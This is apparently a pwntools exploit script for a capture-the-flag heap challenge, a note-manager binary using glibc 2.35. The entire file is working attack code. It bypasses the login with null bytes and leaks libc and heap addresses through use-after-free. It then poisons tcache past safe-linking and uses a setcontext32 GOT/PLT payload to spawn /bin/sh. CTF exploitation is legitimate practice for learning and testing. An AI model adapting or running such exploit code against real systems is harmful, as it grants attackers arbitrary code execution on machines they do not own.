from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

p = process(stdout=PIPE)
# p = remote("localhost", 5000)

def create_note(size: int, content: bytes):
    p.sendlineafter(b'Enter your choice: ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'content: ', content)


def edit_note(index: int, data: bytes):
    p.sendlineafter(b'Enter your choice: ', b'2')
    p.sendlineafter(b'(0-4): ', str(index).encode())
    p.recvuntil(b'content: ')
    content = p.recvline().strip()

    p.sendlineafter(b'content: ', data)

    return content

def read_note(index: int):
    p.sendlineafter(b'Enter your choice: ', b'3')
    p.sendlineafter(b'(0-4): ', str(index).encode())
    p.recvuntil(b'SIZE: ')
    size = int(p.recvline().split()[0]  )

    p.recvline()
    return size, p.recvline().strip()[5:]

def delete_note(index: int):
    p.sendlineafter(b'Enter your choice: ', b'4')
    p.sendlineafter(b'(0-4): ', str(index).encode())

def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b

def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )


p.sendlineafter(b'Username: ', b'agent')
p.sendlineafter(b'Password: ', b'\x00' * 49)

create_note(0x500, b'a')
create_note(0x400, b'a')
create_note(0x400, b'a')
# context.log_level = 'debug'
delete_note(0)
libc_base = u64(read_note(0)[1].ljust(8, b'\x00')) - 2206944

delete_note(2)
heap_base = u64(read_note(2)[1].ljust(8, b'\x00')) << 12

libc.address = libc_base
dest, pl = setcontext32(
             libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
           )

pl = pl[:0x400]
print(len(pl))

delete_note(1)

# gdb.attach(p)

edit_note(1, pack(encrypt(heap_base+1968, dest)))

create_note(0x400, b'a')
create_note(0x400, pl)

p.interactive()
